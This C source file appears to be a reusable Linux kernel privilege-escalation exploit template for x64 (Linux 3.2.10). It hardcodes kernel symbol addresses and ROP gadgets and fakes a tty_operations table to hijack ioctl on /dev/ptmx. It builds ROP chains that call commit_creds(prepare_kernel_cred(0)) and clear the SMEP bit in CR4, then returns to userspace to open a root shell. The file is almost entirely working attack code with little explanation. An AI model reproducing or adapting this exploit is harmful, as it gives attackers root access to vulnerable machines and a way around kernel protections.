//official imports.
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<sys/stat.h>
#include<stdint.h>
#include<sys/mman.h>
#include<sys/ioctl.h>
#include<errno.h>
#include<string.h>

//auth0r: afang

//kernel escalate template for x64.

//define critical values
#define commit_creds_addr        (size_t)0xffffffff81073f40
#define prepare_kernel_cred_addr (size_t)0xffffffff810741f0

//define target mmap address
#define target_mmap_addr         (size_t)0x00000000ffff2500

//define useful gadgets
//linux version 3.2.10
#define iretq_addr   	         (size_t)0xffffffff8158a056 //iretq for x64
#define xchgeax_addr 	         (size_t)0 //xchg eax,esp;ret 
#define poprdi_addr  	         (size_t)0xffffffff811bfdbd //pop rdi;ret 
#define poprdx_addr  	         (size_t)0xffffffff81286be2 //pop rdx;ret
#define xchgebp_addr 	         (size_t)0xffffffff81805b39 //xchg ebp, esp; ret 0
#define movrdirax_callrdx_addr   (size_t)0xffffffff8107b33b //mov rdi, rax; call rdx
#define swapgs_addr              (size_t)0xffffffff8158a38b //swapgs
#define poprax_addr              (size_t)0xffffffff8139c225 //pop rax ; ret
#define movcr4_poprbp_addr       (size_t)0xffffffff8100a928 //mov cr4, rax ; pop rbp ; ret

//define facilities
#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void *)KERNCALL = (void*)commit_creds_addr;
void *(*prepare_kernel_cred)(void*) KERNCALL = (void*)prepare_kernel_cred_addr;

void interactive(){

	execl("/bin/sh", "sh", NULL);
}

//define critical structures

struct trap_frame{
	void *rip;
	uint64_t cs;
	uint64_t eflags;
	void *rsp;
	uint64_t ss;
};

struct trap_frame tf;

//linux-3.2.10
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct inode *inode, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);
//#ifdef CONFIG_CONSOLE_POLL
//	int (*poll_init)(struct tty_driver *driver, int line, char *options);
//	int (*poll_get_char)(struct tty_driver *driver, int line);
//	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
//#endif
	const struct file_operations *proc_fops;
};

void prepare_fake_tty_operations(size_t *ptr){

	//this func intends for faking tty_struct + 0x18 to fake_tty_operations..
	
	//create fake tty_operations to hijack ioctl(fd(/dev/ptmx),0,0)		
	struct tty_operations *fake_ttyop = (struct tty_operations *)malloc(sizeof(struct tty_operations));
	//memset it to zeros.
	memset(fake_ttyop , 0, sizeof(struct tty_operations));
	fake_ttyop->ioctl = (size_t) xchgebp_addr;
	fake_ttyop->close = (size_t) xchgebp_addr;
	*ptr = (size_t)fake_ttyop;	
}

void prepare_tf(){

	asm("mov rcx, cs;"
		"mov [tf+8], rcx;"
		"pushf;"
		"pop rcx;"
		"mov [tf+16],rcx;"
		"push rsp;"
		"pop rcx;"
		"mov [tf+24], rcx;"
		"mov rcx, ss;"
		"mov [tf+32], rcx;");
	tf.rip = &interactive;
	tf.rsp -= 1024;
}

void escalate(){

	commit_creds(prepare_kernel_cred(0));	
//	asm("lea rsp, tf;"
//		"swapgs;"
//		"iretq;");
}

//mmap a rwx region for ROP.
void* allocate(void *addr, size_t size){

	printf("request allocate at : %p\n", addr);
	printf("request size : %lu\n", size);

	void *target_addr = (void*)((size_t)addr & 0xffff0000);
	printf("real allocate at: %p\n", target_addr);


	size_t *ptr = mmap((void*)target_addr, (size+0x4000), PROT_READ|PROT_WRITE, 	MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); //mmap one more 0x1000 for kernel func stack usage.
	printf("real allocate at: %p\n", ptr);
	printf("will return : %p\n", addr);
	if((void*)((size_t)addr & 0xffff0000) != (void*)ptr){
	perror("[*]There's problem ");
	exit(-1);
	}
	return addr;
}


//this runs code directly at userspace insteadof rop.
void ret2usr(){

	asm("lea rsp, tf;"
		"swapgs;"
		"iretq;");
}

//under the circumstance no smep enabled.
//if we control kernel rip , just jump here.
//and we will get a root shell.
void usr_escalate(){
	escalate();
	ret2usr();
}

//remote guard: 
//smep && !smap
//use this payload to put rop chain in designed place.
void kernel_rop_escalate(){

	//mmap to target region.
	size_t *rop_ptr = (size_t*)allocate((size_t*)target_mmap_addr, 0x1000);
	//now , set the rop gadgets.
	//first , we need rop to commit_creds.
	*rop_ptr       = (size_t)poprdi_addr;
	*(rop_ptr + 1) = (size_t)0;
	*(rop_ptr + 2) = prepare_kernel_cred_addr;
	*(rop_ptr + 3) = poprdx_addr;
	*(rop_ptr + 4) = commit_creds_addr + 4;
	*(rop_ptr + 5) = movrdirax_callrdx_addr;
	*(rop_ptr + 6) = swapgs_addr;
	*(rop_ptr + 7) = iretq_addr;
	//set iretq frame
	*(rop_ptr + 8)  = (size_t)&interactive;
	*(rop_ptr + 9)  = (size_t)tf.cs;
	*(rop_ptr + 10) = (size_t)tf.eflags;
	*(rop_ptr + 11) = (size_t)tf.rsp;
	*(rop_ptr + 12) = (size_t)tf.ss;
}

//rop2 disable smep && ret2usr
void kernel_rop_disable_smep(){

	printf("flip cr4 20th bit to disable smep.\n");
	size_t *rop_ptr = (size_t*)allocate((size_t*)target_mmap_addr, 0x1000);
	*rop_ptr        = poprax_addr;
	*(rop_ptr + 1)  = (size_t)0x6f0;
	*(rop_ptr + 2)  = movcr4_poprbp_addr; 
	*(rop_ptr + 3)  = (size_t)0;
	*(rop_ptr + 4)  = (size_t)&usr_escalate;
}

